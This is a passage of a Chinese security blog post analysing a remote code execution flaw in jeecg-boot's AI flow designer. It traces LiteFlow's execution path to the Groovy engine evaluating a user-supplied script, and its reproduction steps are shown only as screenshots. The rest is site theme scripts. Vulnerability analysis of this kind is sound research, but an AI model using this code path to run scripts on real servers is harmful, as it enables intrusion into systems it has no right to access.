class="line">    <span class="comment">// 异步提交流程执行</span></span><br><span class="line">    <span class="built_in">this</span>.flowExecutor.execute2Future(</span><br><span class="line">        flowRunParams.getFlowId(),    <span class="comment">// 临时 UUID</span></span><br><span class="line">        (Object) <span class="literal">null</span>,                <span class="comment">// param = null</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;context&#125;         <span class="comment">// contextBeanArray = [JeecgFlowContext]</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">//立即返回 SSE 连接（不等待执行完成）</span></span><br><span class="line">    <span class="keyword">return</span> emitter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>显而易见重点就在于倒二行的<code>this.flowExecutor.execute2Future</code>方法，我们跟进去</p>
+<p>库库跟了之后会走到FlowExecutor.doExcute方法处</p>
+<img src="../source/imgs/${fiilname}/image-20260315221806893.png" alt="image-20260315221806893" style="zoom:50%;" />
+
+<p>首先进行了一个FlowBus的初始化检查之后，会进行Slot的分配操作</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Integer slotIndex;</span><br><span class="line"><span class="keyword">if</span> (ArrayUtil.isNotEmpty(contextBeanClazzArray)) &#123;</span><br><span class="line">    slotIndex = DataBus.offerSlotByClass(ListUtil.toList(contextBeanClazzArray));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 走这个分支</span></span><br><span class="line">    slotIndex = DataBus.offerSlotByBean(ListUtil.toList(contextBeanArray));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Slot 是什么</strong>：LiteFlow 的数据总线 <code>DataBus</code> 维护一个 Slot 池（类似线程池的概念）。每次流程执行都需要占用一个 Slot 来存储本次执行的上下文数据、执行步骤、结果等。</p>
+<p><strong>在本漏洞场景</strong>：<code>contextBeanClazzArray = null</code>，<code>contextBeanArray = [JeecgFlowContext]</code>，所以走 <code>offerSlotByBean</code> 分支——直接用用户传入的 <strong><code>JeecgFlowContext</code> 实例</strong>初始化 Slot。这意味着攻击者通过 POST body 间接控制的上下文对象被放入了执行环境。</p>
+<p>往下走，FlowExecutor.doExcute方法中重点关注后面chain的获取和执行操作</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chain = FlowBus.getChain(chainId);</span><br><span class="line"><span class="comment">// chainId = debugFlow() 中生成的临时 UUID</span></span><br><span class="line"><span class="comment">// FlowBus 中已在前面 reloadChain() 时注册了 &quot;THEN(start..., code_xxx..., end...)&quot;</span></span><br><span class="line"><span class="keyword">if</span> (chainExecuteModeEnum.equals(ChainExecuteModeEnum.BODY)) &#123;</span><br><span class="line">    chain.execute(slotIndex);  <span class="comment">//执行编排链！</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编排规则是 <code>THEN(start, code_252727837582266368, end)</code>，所以chain.execute方法会按顺序依次执行节点</p>
+<p>我们跟进去</p>
+<p><img src="/../source/imgs/$%7Bfiilname%7D/image-20260316153258695.png" alt="image-20260316153258695"></p>
+<p>首先会进行一个condition列表的获取，<code>conditionList</code> 就是经过 EL 编译后的<strong>执行条件列表</strong>，这个列表即是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conditionList = [ ThenCondition ]</span><br><span class="line">                      └── 内含 3 个 Node: start → code_252727837582266368 → end</span><br></pre></td></tr></table></figure>
+
+<p>该方法继续往下走，会遍历condition并依次执行</p>
+<p><img src="/../source/imgs/$%7Bfiilname%7D/image-20260316154222759.png" alt="image-20260316154222759"></p>
+<p>对每个 Condition：</p>
+<ol>
+<li>设置当前 Chain ID（用于嵌套链路追踪）</li>
+<li>调用 <code>condition.execute(slotIndex)</code></li>
+</ol>
+<p>而我们的列表中只有一个ThenCondition，跟进<code>condition.execute(slotIndex);</code></p>
+<img src="../source/imgs/${fiilname}/image-20260316154546046.png" alt="image-20260316154546046" style="zoom:50%;" />
+
+<p>可以看到该类是一个抽象类，所以真正运行该方法的是它的继承类</p>
+<p><code>Condition.execute()</code> 中调用的 <code>this.executeCondition(slotIndex)</code> 是<strong>抽象方法</strong>，**<code>this</code> 永远指向实际对象**，不是声明类型</p>
+<p>而在这里很明显就是ThenCondition类，走进去</p>
+<img src="../source/imgs/${fiilname}/image-20260316154902753.png" alt="image-20260316154902753" style="zoom:50%;" />
+
+<p><code>List&lt;PreCondition&gt; preConditionList = this.getPreConditionList();</code>该行代码所要收集的List列表对应 LiteFlow EL 中的 <code>PRE(...)</code> 语法。在我们的 PoC 中没有 PRE 条件，<code>preConditionList</code> 为空</p>
+<p>因此在while循环中会直接进入到if从句中</p>
+<p><code>var17 = this.getExecutableList().iterator();</code>返回 EL 编译后的执行元素列表，对 PoC 中的 chain</p>
+<p><code>executableList=[Node(&quot;start&quot;), Node(&quot;code_xxx&quot;), Node(&quot;end&quot;)]</code>在while循环中会<strong>串行遍历执行</strong>，每个 <code>Executable</code> 在这里就是一个Node 对象，我们重点关注的是第二个Node</p>
+<p>我们继续跟进去</p>
+<img src="../source/imgs/${fiilname}/image-20260316160946807.png" alt="image-20260316160946807" style="zoom:50%;" />
+
+<p>继续跟进去</p>
+<img src="../source/imgs/${fiilname}/image-20260316161336351.png" alt="image-20260316161336351" style="zoom:50%;" />
+
+<p>在这里第二个Node绑定的instance根据上面的<code>LiteFlowNodeBuilder.build()</code>可知绑定的组件是ScriptCommonComponent</p>
+<p>继续跟进<code>instance.execute();</code></p>
+<img src="../source/imgs/${fiilname}/image-20260316161911324.png" alt="image-20260316161911324" style="zoom:50%;" />
+
+<p>由图我们可知该类中并没有execute方法，所以会向上查找其父类<code>NodeComponent</code>，利用它的execute方法</p>
+<img src="../source/imgs/${fiilname}/image-20260316162043884.png" alt="image-20260316162043884" style="zoom:50%;" />
+
+<p>跟进<code>this.self.process();</code>，就走回到了<code>ScriptCommonComponent</code>类里面的process方法</p>
+<img src="../source/imgs/${fiilname}/image-20260316162153514.png" alt="image-20260316162153514" style="zoom:50%;" />
+
+<p><code>this.buildWrap(this)</code> 的作用是将当前脚本组件的运行时上下文打包成一个 <code>ScriptExecuteWrap</code> 对象，供后续脚本执行器使用。其实本质上就是将分散在各处的运行信息给集中起来</p>
+<p>继续跟进<code>this.scriptExecutor.execute(wrap);</code></p>
+<img src="../source/imgs/${fiilname}/image-20260316162505381.png" alt="image-20260316162505381" style="zoom:50%;" />
+
+<p>抽象类，由于poc里面的是groovy脚本，所以是走进<code>JSR223ScriptExecutor</code>的<code>executeScript</code>方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">executeScript</span><span class="params">(ScriptExecuteWrap wrap)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">   <span class="keyword">if</span> (!<span class="built_in">this</span>.compiledScriptMap.containsKey(wrap.getNodeId())) &#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">errorMsg</span> <span class="operator">=</span> StrUtil.format(<span class="string">&quot;script for node[&#123;&#125;] is not loaded&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;wrap.getNodeId()&#125;);</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ScriptLoadException</span>(errorMsg);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="type">CompiledScript</span> <span class="variable">compiledScript</span> <span class="operator">=</span> (CompiledScript)<span class="built_in">this</span>.compiledScriptMap.get(wrap.getNodeId());</span><br><span class="line">      <span class="type">Bindings</span> <span class="variable">bindings</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleBindings</span>();</span><br><span class="line">      <span class="built_in">this</span>.bindParam(wrap, bindings::put, bindings::putIfAbsent);</span><br><span class="line">      <span class="keyword">return</span> compiledScript.eval(bindings);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>if从句检测脚本是否已经成加载并存到了compiledScriptMap中，而从我们一开始的分析中便知道了在<code>LiteFlowNodeBuilder.build()</code>方法中便已经存放进去了</p>
+<p>跟进<code>return compiledScript.eval(bindings);</code></p>
+<img src="../source/imgs/${fiilname}/image-20260316163213240.png" alt="image-20260316163213240" style="zoom:50%;" />
+
+<p>动用groovy引擎来执行恶意脚本，达到rce的成果</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>AI大模型–AI流程设计–添加流程</p>
+<p><img src="/../source/imgs/$%7Bfiilname%7D/image-20260316165418280.png" alt="image-20260316165418280"></p>
+<p>添加成功后进去添加脚本执行</p>
+<p><img src="/../source/imgs/$%7Bfiilname%7D/image-20260316170357709.png" alt="image-20260316170357709"></p>
+<img src="../source/imgs/${fiilname}/image-20260316171111749.png" alt="image-20260316171111749" style="zoom:50%;" />
+</article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>License</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"></div><div class="item" id="next"><div class="note">Older</div><a href="/2026/03/09/jeecg-boot-3-7-0-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">jeecg-boot 3.7.0 漏洞分析</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">Sherlock</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1">Stellar 1.33.1</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">On This Page</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>Scroll to Top</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `Just`,
+      min: `minutes ago`,
+      hour: `hours ago`,
+      day: `days ago`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    // applyThemeToGiscus(theme)
+  }
+
+  // FIXME: 这会导致无法使用 preferred_color_scheme 以外的主题
+  const applyThemeToGiscus = (theme) => {
+    // theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    utils.dark.mode = newTheme === 'auto' ? (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light") : newTheme;
+    utils.dark.method.toggle.start();
+
+    const messages = {
+      light: `Switched to Light Mode`,
+      dark: `Switched to Dark Mode`,
+      auto: `Switched to Auto Mode`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      utils.dark.mode = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
+    }
+    utils.dark.method.toggle.start();
+  })()
+</script>
+
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
